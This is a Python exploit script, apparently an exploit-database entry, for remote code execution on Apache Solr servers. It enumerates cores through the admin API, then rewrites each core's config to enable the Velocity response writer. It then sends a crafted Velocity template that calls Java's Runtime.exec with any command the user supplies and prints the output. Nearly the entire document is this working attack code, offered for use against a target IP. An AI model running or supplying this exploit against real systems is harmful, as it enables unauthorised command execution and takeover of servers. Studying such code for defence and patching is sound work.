# Author: @l3x_wong
# Vendor: https://lucene.apache.org/solr/
# Software Link: https://lucene.apache.org/solr/downloads.html
# CVE: N/A
# github: https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template

# usage: python3 script.py ip [port [command]]
#                default port=8983
#                default command=whoami
# note:
# Step1: Init Apache Solr Configuration
# Step2: Remote Exec in Every Solr Node

import sys
import json
import time
import requests


class initSolr(object):

    timestamp_s = str(time.time()).split(&#039;.&#039;)
    timestamp = timestamp_s[0] + timestamp_s[1][0:-3]

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def get_nodes(self):
        payload = {
            &#039;_&#039;: self.timestamp,
            &#039;indexInfo&#039;: &#039;false&#039;,
            &#039;wt&#039;: &#039;json&#039;
        }
        url = &#039;http://&#039; + self.ip + &#039;:&#039; + self.port + &#039;/solr/admin/cores&#039;

        try:
            nodes_info = requests.get(url, params=payload, timeout=5)
            node = list(nodes_info.json()[&#039;status&#039;].keys())
            state = 1
        except:
            node = &#039;&#039;
            state = 0

        if node:
            return {
                &#039;node&#039;: node,
                &#039;state&#039;: state,
                &#039;msg&#039;: &#039;Get Nodes Successfully&#039;
            }
        else:
            return {
                &#039;node&#039;: None,
                &#039;state&#039;: state,
                &#039;msg&#039;: &#039;Get Nodes Failed&#039;
            }

    def get_system(self):
        payload = {
            &#039;_&#039;: self.timestamp,
            &#039;wt&#039;: &#039;json&#039;
        }
        url = &#039;http://&#039; + self.ip + &#039;:&#039; + self.port + &#039;/solr/admin/info/system&#039;
        try:
            system_info = requests.get(url=url, params=payload, timeout=5)
            os_name = system_info.json()[&#039;system&#039;][&#039;name&#039;]
            os_uname = system_info.json()[&#039;system&#039;][&#039;uname&#039;]
            os_version = system_info.json()[&#039;system&#039;][&#039;version&#039;]
            state = 1

        except:
            os_name = &#039;&#039;
            os_uname = &#039;&#039;
            os_version = &#039;&#039;
            state = 0

        return {
            &#039;system&#039;: {
                &#039;name&#039;: os_name,
                &#039;uname&#039;: os_uname,
                &#039;version&#039;: os_version,
                &#039;state&#039;: state
            }
        }


class apacheSolrRCE(object):

    def __init__(self, ip, port, node, command):
        self.ip = ip
        self.port = port
        self.node = node
        self.command = command
        self.url = "http://" + self.ip + &#039;:&#039; + self.port + &#039;/solr/&#039; + self.node

    def init_node_config(self):
        url = self.url + &#039;/config&#039;
        payload = {
            &#039;update-queryresponsewriter&#039;: {
                &#039;startup&#039;: &#039;lazy&#039;,
                &#039;name&#039;: &#039;velocity&#039;,
                &#039;class&#039;: &#039;solr.VelocityResponseWriter&#039;,
                &#039;template.base.dir&#039;: &#039;&#039;,
                &#039;solr.resource.loader.enabled&#039;: &#039;true&#039;,
                &#039;params.resource.loader.enabled&#039;: &#039;true&#039;
            }
        }
        try:
            res = requests.post(url=url, data=json.dumps(payload), timeout=5)
            if res.status_code == 200:
                return {
                    &#039;init&#039;: &#039;Init node config successfully&#039;,
                    &#039;state&#039;: 1
                }
            else:
                return {
                    &#039;init&#039;: &#039;Init node config failed&#039;,
                    &#039;state&#039;: 0
                }
        except:
            return {
                &#039;init&#039;: &#039;Init node config failed&#039;,
                &#039;state&#039;: 0
            }

    def rce(self):
        url = self.url + ("/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
                          "%23set($x=%27%27)+"
                          "%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+"
                          "%23set($chr=$x.class.forName(%27java.lang.Character%27))+"
                          "%23set($str=$x.class.forName(%27java.lang.String%27))+"
                          "%23set($ex=$rt.getRuntime().exec(%27" + self.command +
                          "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+"
                          "%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end")
        try:
            res = requests.get(url=url, timeout=5)
            if res.status_code == 200:
                try:
                    if res.json()[&#039;responseHeader&#039;][&#039;status&#039;] == &#039;0&#039;:
                        return &#039;RCE failed @Apache Solr node %s\n&#039; % self.node
                    else:
                        return &#039;RCE failed @Apache Solr node %s\n&#039; % self.node
                except:
                    return &#039;RCE Successfully @Apache Solr node %s\n %s\n&#039; % (self.node, res.text.strip().strip(&#039;0&#039;))

            else:
                return &#039;RCE failed @Apache Solr node %s\n&#039; % self.node
        except:
            return &#039;RCE failed @Apache Solr node %s\n&#039; % self.node


def check(ip, port=&#039;8983&#039;, command=&#039;whoami&#039;):
    system = initSolr(ip=ip, port=port)
    if system.get_nodes()[&#039;state&#039;] == 0:
        print(&#039;No Nodes Found. Remote Exec Failed!&#039;)
    else:
        nodes = system.get_nodes()[&#039;node&#039;]
        systeminfo = system.get_system()
        os_name = systeminfo[&#039;system&#039;][&#039;name&#039;]
        os_version = systeminfo[&#039;system&#039;][&#039;version&#039;]
        print(&#039;OS Realese: %s, OS Version: %s\nif remote exec failed, &#039;
              &#039;you should change your command with right os platform\n&#039; % (os_name, os_version))

        for node in nodes:
            res = apacheSolrRCE(ip=ip, port=port, node=node, command=command)
            init_node_config = res.init_node_config()
            if init_node_config[&#039;state&#039;] == 1:
                print(&#039;Init node %s Successfully, exec command=%s&#039; % (node, command))
                result = res.rce()
                print(result)
            else:
                print(&#039;Init node %s Failed, Remote Exec Failed\n&#039; % node)


if __name__ == &#039;__main__&#039;:
    usage = (&#039;python3 script.py ip [port [command]]\n &#039;
             &#039;\t\tdefault port=8983\n &#039;
             &#039;\t\tdefault command=whoami&#039;)

    if len(sys.argv) == 4:
        ip = sys.argv[1]
        port = sys.argv[2]
        command = sys.argv[3]
        check(ip=ip, port=port, command=command)
    elif len(sys.argv) == 3:
        ip = sys.argv[1]
        port = sys.argv[2]
        check(ip=ip, port=port)
    elif len(sys.argv) == 2:
        ip = sys.argv[1]
        check(ip=ip)
    else:
        print(&#039;Usage: %s:\n&#039; % usage)

